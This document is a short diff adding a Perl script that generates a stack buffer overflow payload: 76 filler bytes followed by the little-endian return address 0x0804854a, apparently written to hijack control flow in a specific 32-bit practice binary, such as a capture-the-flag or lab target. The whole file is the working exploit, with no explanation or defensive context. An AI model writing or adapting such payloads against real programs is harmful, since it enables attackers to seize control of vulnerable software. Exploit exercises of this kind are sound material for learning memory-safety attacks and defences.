@@ -1,0 +1,6 @@
+#! /usr/bin/perl
+# --- Overflow the Buffer ---
+print "A"x76;
+# --- Modify Ret Address ---
+#0x0804854a
+print "\x4a\x85\x04\x08";
